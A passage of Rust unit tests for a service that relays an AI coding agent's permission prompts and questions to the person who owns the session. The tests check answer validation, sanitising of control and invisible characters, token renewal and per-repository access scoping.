            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.display = "\u{202e}\n ".into()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.session = "s\n".into()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.missing.unshown = vec!["x".into(); MAX_UNSHOWN + 1]),
            Err(Refusal::Invalid(_))
        ));
        let id = attempt(&|r| r.display = "y".repeat(MAX_DISPLAY_CHARS + 1))
            .unwrap()
            .0;
        requests.confirm("tok_a", "s", 1_002);
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, 1_003),
            Ok(Decision::Allow)
        ));
    }

    fn with() -> With {
        With::default()
    }

    #[test]
    fn a_request_carries_its_choices_and_a_typed_reason_to_its_hook() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let offer = Offer {
            takes_reason: true,
            choices: vec![Choice {
                label: "Allow, and do not ask\nagain for this".into(),
                saves: "the rule Bash(python3 -c \"print(1)\"), in local settings".into(),
            }],
            questions: Vec::new(),
        };
        let register = |offer: Offer, hash: &str, at| {
            let made =
                requests.register_with(&waiting, &mine, registration("s", None, hash), offer, at);
            requests.confirm("tok_a", "s", at);
            made
        };
        let id = register(offer.clone(), HASH, 1_002).unwrap().0;
        let at = 1_000 + GRACE_SECONDS;
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        assert!(shown[0].deny_reason);
        // One clean line each. A rule keeps its quotes, since it is shown exactly.
        let choice = &shown[0].choices[0];
        assert_eq!(
            (
                choice.id.as_str(),
                choice.label.as_str(),
                choice.saves.as_str()
            ),
            (
                "0",
                "Allow, and do not ask again for this",
                "the rule Bash(python3 -c \"print(1)\"), in local settings"
            )
        );
        let answer = |id: &str, decision, with: With| {
            requests.answer(&waiting, "usr_me", Some(7), id, Said { decision, with }, at)
        };
        // What goes with a decision must fit it and this request.
        let reason = |text: &str| With {
            reason: Some(text.into()),
            ..with()
        };
        let choice = |position| With {
            choice: Some(position),
            ..with()
        };
        let answers = With {
            answers: Some(vec![Picked::Options(vec![0])]),
            ..with()
        };
        for (decision, sent) in [
            (Decision::Allow, choice(1)),
            (Decision::Allow, reason("because")),
            (Decision::Allow, answers),
            (Decision::Deny, choice(0)),
            (Decision::Deny, reason(" \u{200b} ")),
            (Decision::Deny, reason(&"x".repeat(MAX_TYPED_CHARS + 1))),
        ] {
            assert!(matches!(
                answer(&id, decision, sent.clone()),
                Err(Refusal::Invalid(_))
            ));
        }
        assert_eq!(requests.sent_with("tok_a", &id), with());
        assert!(matches!(
            answer(&id, Decision::Allow, choice(0)),
            Ok(Decision::Allow)
        ));
        // Only the hook that registered the request reads what was sent with the answer.
        assert_eq!(requests.sent_with("tok_a", &id), choice(0));
        assert_eq!(requests.sent_with("tok_b", &id), with());
        // The same answer again is accepted; the same decision with something else is another
        // answer, and the first one stands.
        assert!(matches!(
            answer(&id, Decision::Allow, choice(0)),
            Ok(Decision::Allow)
        ));
        assert!(matches!(
            answer(&id, Decision::Allow, with()),
            Err(Refusal::AlreadyAnswered)
        ));
        assert_eq!(requests.sent_with("tok_a", &id), choice(0));
        // A prompt registered again is the same request only while it offers the same: an
        // answer names a choice by its position.
        wait(&waiting, &mine, "t", WaitReason::Permission, None, at);
        let again = |offer: Offer| {
            requests
                .register_with(&waiting, &mine, registration("t", None, HASH), offer, at)
                .unwrap()
                .0
        };
        let first = again(offer.clone());
        assert_eq!(again(offer.clone()), first);
        let fewer = Offer {
            choices: Vec::new(),
            ..offer.clone()
        };
        assert_ne!(again(fewer), first);
        // A typed reason is cleaned like a display.
        let id = register(offer, OTHER_HASH, at).unwrap().0;
        assert!(matches!(
            answer(&id, Decision::Deny, reason("use uv run\r\n\tnot pip\u{1b}")),
            Ok(Decision::Deny)
        ));
        assert_eq!(
            requests.sent_with("tok_a", &id),
            reason("use uv run\n not pip")
        );
        // A hook that does not say it passes a reason on gets none, and offers none.
        let id = register(Offer::default(), HASH, at).unwrap().0;
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        let row = shown.iter().find(|row| row.request_id == id).unwrap();
        assert!(!row.deny_reason && row.choices.is_empty() && row.questions.is_empty());
        assert!(matches!(
            answer(&id, Decision::Deny, reason("no")),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            answer(&id, Decision::Deny, with()),
            Ok(Decision::Deny)
        ));
        // The hook is told what was sent beside the decision, and nothing when there is nothing.
        let polled = |with: With| {
            serde_json::to_value(Polled {
                request_id: "00ff".into(),
                input_hash: "h".into(),
                state: "answered",
                decision: Some("allow"),
                with,
            })
            .unwrap()
        };
        assert_eq!(
            polled(with()),
            json!({"request_id": "00ff", "input_hash": "h", "state": "answered",
                "decision": "allow"})
        );
        assert_eq!(polled(choice(2))["choice"], 2);
        let picked = With {
            answers: Some(vec![
                Picked::Options(vec![0, 2]),
                Picked::Text("typed".into()),
            ]),
            ..with()
        };
        assert_eq!(
            polled(picked)["answers"],
            json!([{"options": [0, 2]}, {"text": "typed"}])
        );
        // An offer past its bounds, or with a label that shows nothing, is refused.
        let one = Choice {
            label: "x".into(),
            saves: "y".into(),
        };
        let hidden = Choice {
            label: "\u{200b}".into(),
            saves: "y".into(),
        };
        // What a choice saves must read exactly as the machine sent it.
        let inexact = Choice {
            label: "x".into(),
            saves: "the rule Bash(ls)\u{202e}".into(),
        };
        for choices in [vec![one; MAX_CHOICES + 1], vec![hidden], vec![inexact]] {
            let offer = Offer {
                choices,
                ..Offer::default()
            };
            assert!(matches!(
                register(offer, HASH, at),
                Err(Refusal::Invalid(_))
            ));
        }
    }

    #[test]
    fn a_question_needs_a_question_wait_and_is_answered_by_position_or_typed_text() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let option = |label: &str| QuestionOption {
            label: label.into(),
            description: String::new(),
        };
        let offer = Offer {
            takes_reason: true,
            choices: Vec::new(),
            questions: vec![
                Question {
                    question: "Which color?".into(),
                    header: "Color".into(),
                    options: vec![option("Red"), option("Blue")],
                    multiple: false,
                },
                Question {
                    question: "Which sizes?".into(),
                    header: String::new(),
                    options: vec![option("S"), option("M"), option("L")],
                    multiple: true,
                },
            ],
        };
        let register = |at| {
            requests.register_with(
                &waiting,
                &mine,
                registration("s", None, HASH),
                offer.clone(),
                at,
            )
        };
        // A question is offered for the session's question, not for a permission prompt.
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        assert!(matches!(register(1_001), Err(Refusal::NotWaiting)));
        waiting.clear("tok_a", "s", None, true);
        wait(&waiting, &mine, "s", WaitReason::Question, None, 1_010);
        let id = register(1_011).unwrap().0;
        // The host's notice names a permission prompt: it confirms the request, and the wait
        // stays the question it is.
        waiting.notice(&mine, "s", "s", "claude", 1_016).unwrap();
        requests.confirm("tok_a", "s", 1_016);
        let at = 1_010 + GRACE_SECONDS;
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        assert_eq!(
            shown[0].item_id,
            format!("waiting:question:{}", wait_key("tok_a", "s"))
        );
        assert_eq!(shown[0].questions, offer.questions);
        let answer = |decision, with: With| {
            requests.answer(
                &waiting,
                "usr_me",
                Some(7),
                &id,
                Said { decision, with },
                at,
            )
        };
        let picked = |answers: Vec<Picked>| With {
            answers: Some(answers),
            ..with()
        };
        let sizes = || Picked::Options(vec![0, 2]);
        for wrong in [
            // Allowed without answers, with a choice, with too few answers.
            with(),
            With {
                choice: Some(0),
                ..with()
            },
            picked(vec![sizes()]),
            // Two options for a question that takes one, one that does not exist, one twice,
            // none at all, and typed text with nothing in it.
            picked(vec![Picked::Options(vec![0, 1]), sizes()]),
            picked(vec![Picked::Options(vec![2]), sizes()]),
            picked(vec![Picked::Options(vec![0]), Picked::Options(vec![1, 1])]),
            picked(vec![Picked::Options(Vec::new()), sizes()]),
            picked(vec![Picked::Text(" ".into()), sizes()]),
        ] {
            assert!(matches!(
                answer(Decision::Allow, wrong.clone()),
                Err(Refusal::Invalid(_))
            ));
        }
        let typed = picked(vec![Picked::Text(" Green, typed by hand ".into()), sizes()]);
        assert!(matches!(
            answer(Decision::Allow, typed),
            Ok(Decision::Allow)
        ));
        assert_eq!(
            requests.sent_with("tok_a", &id),
            picked(vec![Picked::Text("Green, typed by hand".into()), sizes()])
        );
    }

    #[test]
    fn a_request_follows_its_session_to_the_persons_renewed_token() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let old = principal("tok_old", "usr_me", "acme/widgets");
        let new = principal("tok_new", "usr_me", "acme/widgets");
        wait(&waiting, &old, NAMED, WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &old, registration(NAMED, None, HASH), 1_001)
            .unwrap()
            .0;
        requests.confirm(holder(&old, NAMED), NAMED, 1_002);
        // Nobody else's token takes the request over, nor a read-only one, another repository's
        // or a caller without the hook's hash.
        let theirs = principal("tok_x", "usr_them", "acme/widgets");
        let mut reader = new.clone();
        reader.read_only = true;
        let mut elsewhere = new.clone();
        elsewhere.repository_id = Some(8);
        requests.follow(&theirs, &id, HASH, 1_005);
        requests.follow(&reader, &id, HASH, 1_005);
        requests.follow(&elsewhere, &id, HASH, 1_005);
        requests.follow(&new, &id, OTHER_HASH, 1_005);
        assert_eq!(
            requests.token_for("usr_me", Some(7), &id).unwrap(),
            "tok_old"
        );
        // The hook polls under the renewed token: the same request, still pending, which the
        // new token polls from here on and the old one no longer does.
        requests.follow(&new, &id, HASH, 1_010);
        assert_eq!(
            requests.check(&waiting, "tok_new", &id, HASH, 1_011),
            Some(Phase::Pending)
        );
        assert_eq!(requests.check(&waiting, "tok_old", &id, HASH, 1_011), None);
        assert_eq!(
            requests.token_for("usr_me", Some(7), &id).unwrap(),
            "tok_new"
        );
        // The same prompt registered again under the new token is the same request too.
        assert_eq!(
            requests
                .register(&waiting, &new, registration(NAMED, None, HASH), 1_012)
                .unwrap(),
            (id.clone(), Phase::Pending)
        );
        // Another person's token with the same session ID and hash has no wait to offer for.
        assert!(matches!(
            requests.register(&waiting, &theirs, registration(NAMED, None, HASH), 1_012),
            Err(Refusal::NotWaiting)
        ));
        // The session's next call under the new token ends the wait, and the request with it.
        waiting.clear(holder(&new, NAMED), NAMED, None, false);
        assert_eq!(
            requests.check(&waiting, "tok_new", &id, HASH, 1_013),
            Some(Phase::Ended(Ended::SessionMovedOn))
        );
        // The request of a session whose name a client chose stays with its token.
        wait(
            &waiting,
            &old,
            "default",
            WaitReason::Permission,
            None,
            2_000,
        );
        let kept = requests
            .register(&waiting, &old, registration("default", None, HASH), 2_001)
            .unwrap()
            .0;
        requests.follow(&new, &kept, HASH, 2_002);
        assert_eq!(
            requests.token_for("usr_me", Some(7), &kept).unwrap(),
            "tok_old"
        );
    }

    #[test]
    fn an_answer_needs_a_live_agent_of_the_person_for_the_repository() {
        let agent = |id: &str, repository_id| AgentToken {
            id: id.into(),
            name: "laptop".into(),
            repository: "acme/widgets".into(),
            repository_id: Some(repository_id),
            expires_at: 2_000,
            revoked: false,
            read_only: false,
            created_at: 0,
        };
        let takes = |agent: &AgentToken| takes_answer(agent, "tok_old", Some(7), 1_000);
        // The request's own token, or the one this computer renewed it to.
        assert!(takes(&agent("tok_old", 7)));
        assert!(takes(&agent("tok_new", 7)));
        // Not a token for another repository, and none that is revoked, read-only or ended.
        assert!(!takes(&agent("tok_new", 8)));
        let mut revoked = agent("tok_old", 7);
        revoked.revoked = true;
        let mut reader = agent("tok_new", 7);
        reader.read_only = true;
        assert!(!takes(&revoked) && !takes(&reader));
        assert!(!takes_answer(
            &agent("tok_old", 7),
            "tok_old",
            Some(7),
            2_000
        ));
    }

    #[test]
    fn a_notice_routed_to_the_persons_other_repository_confirms_the_prompt() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        // An edit in another repository's checkout: the prompt's hook calls for the repository
        // of the file, the host's notice for the one the session runs in.
        let file = principal("tok_file", "usr_me", "acme/widgets");
        let mut runs = principal("tok_runs", "usr_me", "acme/site");
        runs.repository_id = Some(8);
        wait(&waiting, &file, NAMED, WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &file, registration(NAMED, None, HASH), 1_001)
            .unwrap()
            .0;
        waiting
            .notice(&runs, NAMED, NAMED, "claude", 1_006)
            .unwrap();
        requests.confirm(holder(&runs, NAMED), NAMED, 1_006);
        assert_eq!(
            requests.check(&waiting, "tok_file", &id, HASH, 1_007),
            Some(Phase::Pending)
        );
        // The session has one wait, listed with its request in the repository of the file.
        assert_eq!(waiting.owned(&file, 1_100).unwrap().len(), 1);
        assert!(waiting.owned(&runs, 1_100).unwrap().is_empty());
        // It shows one prompt at a time, whichever repository the next one is offered for.
        requests
            .register(
                &waiting,
                &runs,
                registration(NAMED, None, OTHER_HASH),
                1_101,
            )
            .unwrap();
        assert_eq!(
            requests.check(&waiting, "tok_file", &id, HASH, 1_102),
            Some(Phase::Ended(Ended::Superseded))
        );
    }

    #[test]
    fn the_item_key_matches_the_one_the_waiting_list_reports() {
        let waiting = Waiting::default();
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s1", WaitReason::Permission, None, 1_000);
        let shown = waiting.owned(&mine, 1_000 + GRACE_SECONDS).unwrap();
        assert_eq!(shown[0].key, wait_key("tok_a", "s1"));
    }
}
